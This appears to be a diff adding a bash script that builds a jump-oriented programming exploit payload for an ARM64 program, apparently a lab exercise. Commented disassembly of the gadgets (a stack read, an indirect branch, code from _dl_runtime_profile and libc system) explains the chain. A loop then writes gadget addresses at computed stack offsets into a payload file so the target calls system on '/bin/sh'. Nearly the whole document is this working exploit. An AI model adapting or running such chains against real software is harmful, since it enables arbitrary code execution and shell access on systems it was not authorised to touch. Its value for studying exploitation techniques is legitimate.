@@ -1,0 +1,84 @@
+#!/bin/bash 
+
+#code snippets
+: << 'jop_bad_func'
+Code 1: Use this code to write the stack
+	read(fd,&u64,512);
+  400460:	910063a0 	add	x0, x29, #0x18
+  400464:	d2804002 	mov	x2, #0x200                 	// #512
+  400468:	aa0003e1 	mov	x1, x0
+  40046c:	b94037a0 	ldr	w0, [x29, #52]
+  400470:	94005f6a 	bl	418218 <__libc_read>
+
+Code 2:Use stack to set the x0 = 0x441fc4 (Code 4), stack offset = (56 - 24)/8 = 4
+  400474:       f9401fa0        ldr     x0, [x29, #56]
+  400478:       d63f0000        blr     x0
+ 
+jop_bad_func
+
+dl_c4="\xc4\x1f\x44\x00\x00\x00\x00\x00"
+dl_c4_offset=4
+
+: << 'jop_symbol'
+Code 3:libc_system address 0x44f7f8
+	system("/bin/ls");
+  400404:	f0000260 	adrp	x0, 44f000 <free_category+0x70>
+  400408:	911fe000 	add	x0, x0, #0x7f8
+  40040c:	940019bf 	bl	406b08 <__libc_system>
+	printf("%s\n","/bin/sh");
+  400410:	f0000260 	adrp	x0, 44f000 <free_category+0x70>
+  400414:	91200000 	add	x0, x0, #0x800
+jop_symbol
+
+
+: << '_dl_runtime_profile'
+Code 4: Set the X0 to the libc_system address 0x406b08, will use it at Code 5 to set X16, stack offset = (48 - 24)/8 = 3
+        Set the X30 to 0x441f34 (Code 5),stack offset = (232 - 24)/8 = 26
+  441fc4:	a94307a0 	ldp	x0, x1, [x29, #48]
+  441fc8:	6d4407a0 	ldp	d0, d1, [x29, #64]
+  441fcc:	6d450fa2 	ldp	d2, d3, [x29, #80]
+  441fd0:	f94077be 	ldr	x30, [x29, #232]
+  441fd4:	910003bf 	mov	sp, x29
+  441fd8:	f94003bd 	ldr	x29, [x29]    #X29 = $x29 + 64 according to jop_bad_func
+  441fdc:	910403ff 	add	sp, sp, #0x100
+  441fe0:	d61f03c0 	br	x30
+
+Code 5: Set the X0 point to the /bin/sh , address = 44f800,stack offset = ((96 + 64) - 24) /8 = 17
+  441f34:	aa0003f0 	mov	x16, x0
+  441f38:	a94607a0 	ldp	x0, x1, [x29, #96]
+  441f3c:	a9470fa2 	ldp	x2, x3, [x29, #112]
+  441f40:	a94817a4 	ldp	x4, x5, [x29, #128]
+  441f44:	a9491fa6 	ldp	x6, x7, [x29, #144]
+  441f48:	6d4a07a0 	ldp	d0, d1, [x29, #160]
+  441f4c:	6d4b0fa2 	ldp	d2, d3, [x29, #176]
+  441f50:	6d4c17a4 	ldp	d4, d5, [x29, #192]
+  441f54:	6d4d1fa6 	ldp	d6, d7, [x29, #208]
+  441f58:	a9407bbd 	ldp	x29, x30, [x29]
+  441f5c:	910403ff 	add	sp, sp, #0x100
+  441f60:	d61f0200 	br	x16
+_dl_runtime_profile
+
+libc_system="\x08\x6b\x40\x00\x00\x00\x00\x00"
+libc_system_offset=3
+bash="\x00\xf8\x44\x00\x00\x00\x00\x00"
+bash_offset=17
+
+dl_c5="\x34\x1f\x44\x00\x00\x00\x00\x00"
+dl_c5_offset=26
+
+data=jop.data
+printf "" > $data
+
+for (( i=0; i < 512; ++i)); do 
+	if [ $i -eq $dl_c4_offset ] ; then 
+		printf "$dl_c4" >> $data
+	elif [ $i -eq $dl_c5_offset ] ; then 
+		printf "$dl_c5" >> $data
+	elif [ $i -eq $libc_system_offset ] ; then 
+		printf "$libc_system" >> $data
+	elif [ $i -eq $bash_offset ] ; then 
+		printf "$bash" >> $data
+        else
+		printf "\xff\xff\xff\xff\xff\xff\xff\xff" >> $data
+	fi
+done 
